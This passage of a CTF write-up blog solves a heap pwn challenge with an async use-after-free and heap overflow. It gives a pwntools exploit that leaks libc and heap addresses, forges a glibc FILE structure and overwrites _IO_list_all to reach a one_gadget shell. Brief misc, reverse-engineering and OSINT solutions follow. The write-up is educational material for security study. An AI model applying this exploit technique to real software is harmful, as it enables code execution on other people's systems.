+<p>In our <code>main</code>, we have, of course, a menu, and five options to choose from: <code>establish_link</code>, <code>terminate_link</code>, <code>download_telemetry</code>, <code>upload_commands</code> and <code>exit</code>.</p>
+<p>Using a global array, in this case marked as <code>qword_5080</code>, we can maintain two <em>probes</em> like so: <code>[ probe0_buf | probe0_size | probe1_buf | probe1_size ]</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic5.png#center"></p>
+<p>In <code>establish_link</code>, we essentially allocate a heap chunk for a <em>probe</em>. We&rsquo;re given a size range (1280 to 4096), and the pointer and size are stored in <code>qword_5080</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic6.png#center"></p>
+<p>In <code>terminate_link</code>, we simply free the heap chunk, clear the pointer, but don&rsquo;t check whether the buffer is still in use by the signal handler (more on that later).</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic7.png#center"></p>
+<p>In <code>download_telemetry</code>, the only important line is <code>puts(qword_5080[id])</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic8.png#center"></p>
+<p>In <code>upload_commands</code>, things start to get a little more interesting. We can translate this into something like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>int upload_commands() {
+</span></span><span style="display:flex;"><span>  Probe ID
+</span></span><span style="display:flex;"><span>  read(<span style="color:#ae81ff">0</span>, staging, size)
+</span></span><span style="display:flex;"><span>  active_buf <span style="color:#f92672">=</span> probe_buf
+</span></span><span style="display:flex;"><span>  active_len <span style="color:#f92672">=</span> bytes_read
+</span></span><span style="display:flex;"><span>  alarm(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This <code>active_buf</code> and <code>active_len</code> are <code>qword_5068</code> and <code>qword_5060</code>. This is because <code>read</code> returns the number of bytes read. And in this case <code>active_buf</code> points directly to the probe&rsquo;s heap buffer.</p>
+<p>The signal I mentioned previously is triggered at the end of this alarm, and executes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>memcpy(active_buf, staging, active_len)
+</span></span></code></pre></div><p>Where we control the length. So obviously that <code>alarm</code> is completely out of place; This function is going to be our main issue for this challenge.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic9.png#center"></p>
+<p>We also have a <code>handler</code> function, which looks like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>void handler() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (active_buf)
+</span></span><span style="display:flex;"><span>    memcpy(active_buf, staging, active_len);
+</span></span><span style="display:flex;"><span>  active_buf <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And this runs asynchronously after <code>alarm(3)</code>. So this writes even after the buffer was freed, because it doesn&rsquo;t really check anything properly. So this means we have an <strong>async UAF primitive</strong> at hand.</p>
+<hr>
+<p>So we&rsquo;re looking at a couple of vulnerabilities: this async UAF (Use-After-Free) which is more of a Write-After Free:</p>
+<ul>
+<li>
+<p><code>upload_commands()</code> to set <code>active_buf</code></p>
+</li>
+<li>
+<p><code>terminate_link</code> to free it</p>
+</li>
+<li>
+<p><code>handler</code> to write to freed memory</p>
+</li>
+</ul>
+<p>Then we also have a heap overflow, which was apparently unintended but it exists anyways, since we can make that <code>active_len</code> pretty big.</p>
+<p>Since, as previously mentioned, we&rsquo;re dealing with <code>glibc 2.36</code>, hooks are removed and RelRO is full so we can&rsquo;t overwrite GOT, we have to do something else.</p>
+<p>There is something we can do, though, called <strong>glibc FILE structure exploitation</strong>. <strong><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%2520Structures%2520-%2520Another%2520Binary%2520Exploitation%2520Technique%2520-%2520An-Jie%2520Yang.pdf">Here</a></strong> is a great in-depth resource that talks about it, but I&rsquo;ll try to explain it broadly.</p>
+<p>First, what is a glibc <code>FILE</code>? In C, internally, it looks something like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>struct _IO_FILE_plus {
+</span></span><span style="display:flex;"><span>    _IO_FILE file;
+</span></span><span style="display:flex;"><span>    const struct _IO_jump_t <span style="color:#f92672">*</span>vtable;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p><code>_IO_FILE</code> is the state, so the buffer pointers, and the <code>vtable</code> is function pointers for I/O operations.</p>
+<p>So the <code>vtable</code> is a structure of function pointers that define <em>how</em> this stream should behave when I/O happens. And the <code>_IO_FILE</code> contains the data.</p>
+<p>Luckily, <code>glibc</code> keeps a global linked list of all the open FILEs, <code>_IO_list_all</code>. This includes stdin, stdout, and every open <code>fopen()</code> file.</p>
+<p>When our program exits or flushes streams, glibc runs <code>_IO_flush_all_lockp()</code>.</p>
+<p>This then does</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> each file <span style="color:#f92672">in</span> _IO_list_all:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">-&gt;</span>vtable<span style="color:#f92672">-&gt;</span>overflow(file, EOF)
+</span></span></code></pre></div><p>Or <code>_IO_list_all → stdout → stderr → stdin → ...</code>.</p>
+<p>So what we want to do, is insert a fake FILE into <code>_IO_list_all</code> and control its <code>vtable</code> to call a function pointer we can control. Essentially we overwrite a &lsquo;FILE&rsquo; pointer (anything opened by <code>fopen()</code>) to our own forged structure. (This is, obviously, patched in newer libc versions).</p>
+<p>Problem is we can&rsquo;t make a fake vtable, because glibc verifies it and aborts when something&rsquo;s fishy.</p>
+<p>So in <code>file-&gt;vtable-&gt;overflow(file, EOF);</code> our exploit is going to look like:</p>
+<ul>
+<li>
+<p><code>file</code> is our fake <code>_IO_FILE</code></p>
+</li>
+<li>
+<p><code>vtable</code> is a legitimate vtable that already exists like <code>_IO_wfile_jumps</code></p>
+</li>
+<li>
+<p><code>overflow()</code> to a glibc function that reads from <code>file</code>.</p>
+</li>
+</ul>
+<p>What we want to jump to is a <code>one_gadget</code>, so a piece of shellcode that would just take care of everything and get us a shell.</p>
+<hr>
+<p>Alright, now that that&rsquo;s out of the way, let&rsquo;s start actually working on our exploit. First, we want to leak <code>libc</code>, and we&rsquo;re going to have to mess around with allocations for that.</p>
+<p>So first let&rsquo;s set it up.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>alloc(a, <span style="color:#ae81ff">0x558</span>)
+</span></span><span style="display:flex;"><span>alloc(b, <span style="color:#ae81ff">0x500</span>)
+</span></span></code></pre></div><p>Because both these sizes are larger than the tcache max, they would both go into the unsorted bin, and they don&rsquo;t get merged because of the different sizes. So now the heap looks like <code>[ chunk A (0x558) ][ chunk B (0x500) ][ top chunk ]</code>.</p>
+<p>Now, we need to leak a pointer into <code>main_arena</code> to compute the libc base.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free(a)
+</span></span><span style="display:flex;"><span>alloc(a, <span style="color:#ae81ff">0x700</span>)
+</span></span></code></pre></div><p>This frees our <code>a</code>, and as previously said, it goes into the unsorted bin, and it&rsquo;s <code>fd</code> and <code>bk</code> pointers are set to <code>main_arena + 0x60</code>. After allocating a bigger size, glibc will reuse it, and leftover metadata will still contain some libc pointers.</p>
+<p>Basically the new allocated chunk looks like so:</p>
+<p><code>+0x00  main_arena+0x60</code></p>
+<p><code>+0x08  main_arena+0x60</code></p>
+<p><code>main-arena</code> is inside libc so any pointer to it is a libc pointer. Then we can use <code>upload_telemetry</code> to change one byte into something like an <em>A</em> and then <code>download_telemetry</code> to output the actual <code>libc</code> address.</p>
+<hr>
+<p>We have <code>libc</code>, now we need to get the heap base. Similarly, we overwrite using <code>upload_telemetry</code> so that our chunk looks like this:</p>
+<p><code>+0x00  AAAAAAAA</code></p>
+<p><code>+0x08  AAAAAAAA</code></p>
+<p><code>+0x10  heap pointer</code></p>
+<p>Then we can get it using <code>download_telemetry</code>.</p>
+<p>The script up to now looks like this, first the helper functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(idx, size):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Probe ID: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Buffer size: &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Probe ID: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_buf</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Probe ID: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_buf</span>(idx, data):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Probe ID: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wait_for_write</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;received!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>Then the leaks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alloc(a, <span style="color:#ae81ff">0x558</span>)
+</span></span><span style="display:flex;"><span>alloc(b, <span style="color:#ae81ff">0x500</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(a)
+</span></span><span style="display:flex;"><span>alloc(a, <span style="color:#ae81ff">0x700</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(a)
+</span></span><span style="display:flex;"><span>alloc(a, <span style="color:#ae81ff">0x558</span>)   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_buf(a, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>wait_for_write()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leak unsorted bin fd → main_arena</span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> read_buf(a)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1d2141</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc base @ </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#heap</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwrite first 16 bytes to reach heap pointer</span>
+</span></span><span style="display:flex;"><span>write_buf(a, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>wait_for_write()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> read_buf(a)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">16</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x290</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap base @ </span><span style="color:#e6db74">{</span>hex(heap_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><hr>
+<p>Now the complicated part. We need to build a fake FILE structure. Luckily pwntools has this tool called <code>FileStructure</code> that helps us build a valid <code>_IO_FILE_plus</code> layout. We place it inside of the heap, where we control memory. Then, as I said before, we recycle a preexisting vtable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ch_addr <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x290</span>
+</span></span><span style="display:flex;"><span>fs <span style="color:#f92672">=</span> FileStructure(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>vtable <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_wfile_jumps&#39;</span>]
+</span></span></code></pre></div><p>Next, the <code>one_gadget</code>. Using the <code>libc.so.6</code> file we get:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic10.png#center"></p>
+<p>We can add this along with <code>_lock</code>, which is required for safety, importantly just writeable memory that won&rsquo;t crash. Similarly, <code>_wide_data</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>markers <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd3361</span>  <span style="color:#75715e"># one_gadget</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_lock <span style="color:#f92672">=</span> ch_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>_wide_data <span style="color:#f92672">=</span> ch_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#next some padding</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#f92672">.</span>unknown2 <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    p64(ch_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>Next we overwrite <code>_IO_list_all</code> by freeing a corrupted FILE chunk.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chunk[<span style="color:#ae81ff">0x18</span>:<span style="color:#ae81ff">0x20</span>] <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_list_all&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>fake_chunk<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_IO_list_all <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>fd<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> bk;
+</span></span><span style="display:flex;"><span>_IO_list_all <span style="color:#f92672">=</span> fake_FILE;
+</span></span></code></pre></div><p>Upon freeing this chunk with another <code>free(a)</code>, glibc is going to call <code>_IO_flush_all_lockp</code>.</p>
+<p>Then we need to free the second probe to force glibc to walk the FILE list:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free(b)
+</span></span><span style="display:flex;"><span>alloc(b, <span style="color:#ae81ff">0x500</span>)
+</span></span></code></pre></div><p>And finally, triggering another I/O operation causes glibc to flush streams:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>write(a, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, str(b)<span style="color:#f92672">.</span>encode())
+</span></span></code></pre></div><p>After everything is said and done, our <code>one_gadget</code> is going to get triggered and grant us a shell.</p>
+<p>So the end of the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chunk <span style="color:#f92672">=</span> bytearray(bytes(fs)[<span style="color:#ae81ff">0x10</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x558</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#ae81ff">0x18</span>:<span style="color:#ae81ff">0x20</span>] <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_list_all&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#→ _IO_list_all = fake_FILE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#ae81ff">0x528</span>:<span style="color:#ae81ff">0x540</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p64(heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7c0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#prev_size = 0x31</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#size      = 0x31</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#fd = heap+0x7c0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#bk = heap+0x7c0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#this makes the chunk look like a valid smallbin chunk pointing to controlled heap memory</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#just make it look normal</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk[<span style="color:#ae81ff">0x550</span>:<span style="color:#ae81ff">0x558</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#another anticrash thing</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk <span style="color:#f92672">=</span> bytes(chunk)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write(a, chunk)
+</span></span><span style="display:flex;"><span>free(a)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##here, _IO_list_all = fake_FILE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alloc(a, <span style="color:#ae81ff">0x700</span>)
+</span></span><span style="display:flex;"><span>wait_for_write()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#heap state stabilization</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(b)
+</span></span><span style="display:flex;"><span>alloc(b, <span style="color:#ae81ff">0x500</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#trigger a free that runs our payload </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write(a, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, str(b)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive() 
+</span></span></code></pre></div><p>And here is proof that it actually works:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic11.png#center"></p>
+<p>Again, credits to Iacob Razvan Mihai for coming up with this challenge and for the script.</p>
+<h2 id="santa---misc">Santa - misc<a hidden class="anchor" aria-hidden="true" href="#santa---misc">#</a></h2>
+<p>This was an easy challenge, consisting of a Santa AI chatbot, with the description <em>Did santa give you a present this year, you <strong>little helper?</strong></em> (<em>little helper</em> in bold). So I thought they must&rsquo;ve bolded that for a reason, and upon entering the phrase <em>little helper</em> as input for the chatbot, we get the flag.</p>
+<p>The flag: Vianu_CTF(s4nt4_g4ve_you_a_pr3s3n7_T00?)</p>
+<hr>
+<h2 id="c-its-still-a-thing-in-2025---reverse-engineering">C it&rsquo;s Still a Thing in 2025 - Reverse Engineering<a hidden class="anchor" aria-hidden="true" href="#c-its-still-a-thing-in-2025---reverse-engineering">#</a></h2>
+<p>If we open the binary with IDA, we immediately get the flag as plaintext.</p>
+<p>The flag: CTF{b2d7f24e833051d5fc296d4a747281e9d155ecfb636b983cfd70b51ed9b45a32}</p>
+<hr>
+<h2 id="find-it---osint">Find It - OSINT<a hidden class="anchor" aria-hidden="true" href="#find-it---osint">#</a></h2>
+<p>The description for this challenge was <em>Find the hidden secret in a photo uploaded by N0th1ngUs3r on a platform that starts with &ldquo;F&rdquo;.</em>. The platform for this was Flickr, some image sharing forum, and after finding the user, we find QR code that they posted, which leads to the flag upon scanning.</p>
+<p>The flag: CTF{fd3d13ac301958102d1e1038d6a6b0b2e743561b9e31446f42b1d2f32aabeb06}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ret2libc/">Ret2libc</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/jop/">JOP</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
